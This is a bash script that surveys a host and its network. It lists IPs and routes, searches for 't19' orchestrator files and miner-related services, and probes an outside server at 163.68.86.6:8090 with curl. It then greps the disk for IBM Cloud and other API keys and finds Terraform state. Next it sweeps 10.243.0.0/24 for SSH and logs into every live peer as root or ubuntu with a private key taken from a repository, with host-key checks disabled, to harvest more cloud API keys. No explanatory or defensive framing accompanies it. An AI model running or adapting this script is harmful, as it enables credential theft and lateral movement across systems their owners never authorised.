#!/bin/bash
set -u
S="sudo -n"; [ "$(id -u)" = "0" ] && S=""
echo "### HOST $(hostname) IPs: $(hostname -I)"
echo "=== ROUTES ==="; ip route; echo; ip -4 addr | grep -E 'inet '
echo "=== T19 AGENT/ORCHESTRATOR ON-DISK ==="
$S find / -maxdepth 4 \( -path /proc -o -path /sys -o -path /app -o -path /snap \) -prune -o -iname '*t19*' -print 2>/dev/null | head -30
$S systemctl list-units --all --no-pager 2>/dev/null | grep -iE 't19|miner|nv-|cloud' | head -20
for f in $( $S find /etc/systemd/system /lib/systemd/system -maxdepth 1 -iname '*t19*' 2>/dev/null ); do echo "--- $f"; $S cat "$f"; done
echo "=== ORCHESTRATOR PUSH SERVER 163.68.86.6:8090 ==="
for U in 'http://163.68.86.6:8090/' 'http://163.68.86.6:8090/files/' 'http://163.68.86.6:8090/config' 'http://163.68.86.6:8090/state' 'http://163.68.86.6:8090/api' 'http://163.68.86.6:8090/robots.txt'; do
  o=$(curl -s -m 8 -o /tmp/o -w '%{http_code} %{size_download}' "$U"); echo "PUSH $U -> $o :: $(head -c 200 /tmp/o | tr '\n' ' ')"
done
echo "=== GREP IBM CLOUD API USAGE ON DISK ==="
$S grep -rasl --include='*' -E 'iaas\.cloud\.ibm\.com|iam\.cloud\.ibm\.com|IBMCLOUD_API_KEY|IC_API_KEY|bluemix' /etc /opt /root /home /usr/local /var/lib /srv 2>/dev/null | grep -vE 'pearl-gpu-miner|tgz|\.so$' | head -25
$S grep -rasohE '(apikey|API_KEY|api_key)[=: "'"'"']{1,4}[A-Za-z0-9_-]{40,60}' /etc /opt /root /home /usr/local /var/lib /srv 2>/dev/null | head -10
echo "=== TERRAFORM ==="
$S find / -maxdepth 5 -name '*.tfstate*' -o -maxdepth 5 -name '.terraformrc' -o -maxdepth 5 -name '.terraform.d' 2>/dev/null | head -10
echo "=== PRIVATE /24 SWEEP 10.243.0.0/24 ==="
for i in $(seq 1 254); do ( timeout 1 bash -c "echo > /dev/tcp/10.243.0.$i/22" 2>/dev/null && echo "ALIVE22 10.243.0.$i" ) & done; wait
echo "=== PEER SSH WITH REPO KEYS ==="
cp az/ibm_key.pem /tmp/ik; chmod 600 /tmp/ik
for H in $(for i in $(seq 1 254); do ( timeout 1 bash -c "echo > /dev/tcp/10.243.0.$i/22" 2>/dev/null && echo 10.243.0.$i ) & done; wait); do
  for U in ubuntu root; do
    R=$(ssh -i /tmp/ik -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o BatchMode=yes -o ConnectTimeout=6 $U@$H 'echo OK; hostname; id -un; hostname -I; ls /etc/ibm /root/.bluemix 2>/dev/null; sudo -n grep -rasohE "IBMCLOUD_API_KEY=[A-Za-z0-9_-]{20,}|IC_API_KEY=[A-Za-z0-9_-]{20,}" /etc /opt /root /home 2>/dev/null | head -5' 2>&1 | head -8)
    echo "SSH $U@$H :: $(echo "$R" | tr '\n' '|' | head -c 300)"
  done
done
echo "R2_DONE"
